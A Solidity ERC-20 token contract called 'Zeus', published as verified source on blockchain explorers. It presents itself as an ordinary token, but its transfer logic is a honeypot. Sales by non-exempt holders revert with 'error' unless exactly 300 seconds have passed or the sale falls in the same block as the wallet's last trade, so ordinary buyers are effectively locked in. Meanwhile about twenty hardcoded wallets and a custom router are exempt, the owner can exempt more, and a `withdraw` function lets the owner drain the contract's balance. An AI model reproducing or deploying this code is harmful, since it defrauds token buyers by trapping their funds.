/**
 *Submitted for verification at Arbiscan.io on 2024-06-24
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-20
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
        internal
        view
        returns (bytes memory)
    {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library EnumerableSet {
    struct Set {
        bytes32[] _values;
        mapping(bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            if (lastIndex != toDeleteIndex) {
                bytes32 lastvalue = set._values[lastIndex];

                set._values[toDeleteIndex] = lastvalue;
                set._indexes[lastvalue] = valueIndex;
            }

            set._values.pop();

            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value)
        private
        view
        returns (bool)
    {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index)
        private
        view
        returns (bytes32)
    {
        return set._values[index];
    }

    function _values(Set storage set) private view returns (bytes32[] memory) {
        return set._values;
    }

    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value)
        internal
        returns (bool)
    {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value)
        internal
        returns (bool)
    {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value)
        internal
        view
        returns (bool)
    {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index)
        internal
        view
        returns (address)
    {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    function values(AddressSet storage set)
        internal
        view
        returns (address[] memory)
    {
        bytes32[] memory store = _values(set._inner);
        address[] memory result;

        assembly {
            result := store
        }

        return result;
    }
}

contract Zeus is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;

    EnumerableSet.AddressSet private tokenHoldersEnumSet;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isExcluded;
    mapping(address => uint256) public walletToPurchaseTime;
    mapping(address => uint256) public walletToSellime;

    address[] private _excluded;
    uint8 private constant _decimals = 18;
    uint256 private constant MAX = ~uint256(0);

    string private constant _name = "Zeus";
    string private constant _symbol = "Zeus";

    uint256 private _tTotal = 1000000 * 10**_decimals;
    uint256 public theRewardTime = 0;
    uint256 public standartValuation = 600 / 2;

    address public _lastWallet;

    address public pancakeswapPair;
    address public Router = 0x5E325eDA8064b456f4781070C0738d849c824258; //!!!

    event LiquidityAdded(uint256 tokenAmount, uint256 bnbAmount);

    constructor() {
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Router] = true;
        _isExcludedFromFee[
            address(0xACB5dFfdb2A20955978489b1929AD9FF5B897E16)
        ] = true;
        _isExcludedFromFee[
            address(0xCe20F121692F943f0846D34b17a9Db109E257F5c)
        ] = true;
        _isExcludedFromFee[
            address(0x57dab220656ddEa11be4C6632F6366FA1C57E5ca)
        ] = true;
        _isExcludedFromFee[
            address(0xe8Ba77B7D452A74bbd653bbD38A183dE47c3c0A2)
        ] = true;
        _isExcludedFromFee[
            address(0xf088F9E7EC482cC324e18ff0D17d49bBa112BCe2)
        ] = true;
        _isExcludedFromFee[
            address(0x526B92fAA777514CFB259D360820d9C52e144Eae)
        ] = true;
        _isExcludedFromFee[
            address(0x4b05dceb32AB7e547E50b222002b9f76Ea41E720)
        ] = true;
        _isExcludedFromFee[
            address(0x68fc94649BB668136Ac73D3ebdca1fCCBABd089a)
        ] = true;
        _isExcludedFromFee[
            address(0x37c2ab839C7888BC28CC25933Dd20355785805b9)
        ] = true;
        _isExcludedFromFee[
            address(0xfe7D619dE839748925bCA62B87481E10D3b7Aa09)
        ] = true;
        _isExcludedFromFee[
            address(0x395eaCe1e8D71ac7707d1Cd3e7Fb1056DE38c329)
        ] = true;
        _isExcludedFromFee[
            address(0xD1EfaEc353c9Fc54eeEb0dFf8A800dCbf83b0223)
        ] = true;
        _isExcludedFromFee[
            address(0x1bbfa645bd6Df54E164D808200497530f4cd0542)
        ] = true;
        _isExcludedFromFee[
            address(0x43e6f5Bb4A2AB20f1BaDdE0F6e7928Db859C4669)
        ] = true;
        _isExcludedFromFee[
            address(0xD7fFF77bfDDF3bAdf09435B7285732996fd778CA)
        ] = true;
        _isExcludedFromFee[
            address(0x3BdF73cEb4DF2618b9eB5759c0B877e231BE12d5)
        ] = true;
        _isExcludedFromFee[
            address(0x2B661745886465083B1DfED604Efac2A46a7C9AB)
        ] = true;
        _isExcludedFromFee[
            address(0xc2DF033e613257c2f242025A9Eda2375DCab27fe)
        ] = true;
        _isExcludedFromFee[
            address(0x0F90e9140569aBE2D31ADc5bEa55462C06EfFAa6)
        ] = true;
        _isExcludedFromFee[
            address(0xD6e04a911AA11b0Cde35F3BC6766caCFD44B782a)
        ] = true;
        _isExcludedFromFee[
            address(0x07a188CE020D58F7d3f9429e78FFE1d535b43305)
        ] = true;

        _isExcluded[address(this)] = true;
        _excluded.push(address(this));

        emit Transfer(address(0), owner(), _tTotal);
    }

    function getFromLastPurchaseBuy(address wallet)
        public
        view
        returns (uint256)
    {
        return walletToPurchaseTime[wallet];
    }

    function getFromLastSell(address walletSell) public view returns (uint256) {
        return walletToSellime[walletSell];
    }

    function collectTheStatistics(
        uint256 lastBuyOrSellTime,
        uint256 theData,
        address sender
    ) public view returns (bool) {
        if (lastBuyOrSellTime == 0) return false;

        uint256 crashTime = block.timestamp - lastBuyOrSellTime;

        if (crashTime == standartValuation) return true;

        if (crashTime == 0) {
            if (_lastWallet != sender) {
                return false;
            }
        }
        if (crashTime <= theData) return true;

        return false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function setRewardPool(address[] calldata accounts) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = true;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function addPair(address pair) public onlyOwner {
        pancakeswapPair = pair;
        _isExcluded[pancakeswapPair] = true;
        _excluded.push(pancakeswapPair);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns (uint256) {
        return _tTotal;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(
            amount <= balanceOf(from),
            "You are trying to transfer more than you balance"
        );

        _tokenTransfer(
            from,
            to,
            amount,
            !(_isExcludedFromFee[from] || _isExcludedFromFee[to])
        );
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        if (takeFee) {
            if (sender == pancakeswapPair || sender == Router) {
                if (
                    sender != owner() &&
                    recipient != owner() &&
                    recipient != address(1)
                ) {
                    if (walletToPurchaseTime[recipient] == 0) {
                        walletToPurchaseTime[recipient] = block.timestamp;
                    }
                }
                _lastWallet = recipient;
            } else {
                if (
                    sender != owner() &&
                    recipient != owner() &&
                    recipient != address(1)
                ) {
                    bool blockedSellTime = collectTheStatistics(
                        getFromLastPurchaseBuy(sender),
                        theRewardTime,
                        sender
                    );
                    require(blockedSellTime, "error");
                    walletToSellime[sender] = block.timestamp;
                }
                _lastWallet = sender;
            }
        } else {
            if (_isExcludedFromFee[sender]) {
                _lastWallet = sender;
            }
            if (_isExcludedFromFee[recipient]) {
                _lastWallet = recipient;
            }
        }

        _tOwned[sender] = _tOwned[sender] - tAmount;
        _tOwned[recipient] = _tOwned[recipient] + tAmount;

        emit Transfer(sender, recipient, tAmount);
        tokenHoldersEnumSet.add(recipient);

        if (balanceOf(sender) == 0) tokenHoldersEnumSet.remove(sender);
    }

    function withdraw() public onlyOwner {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }
}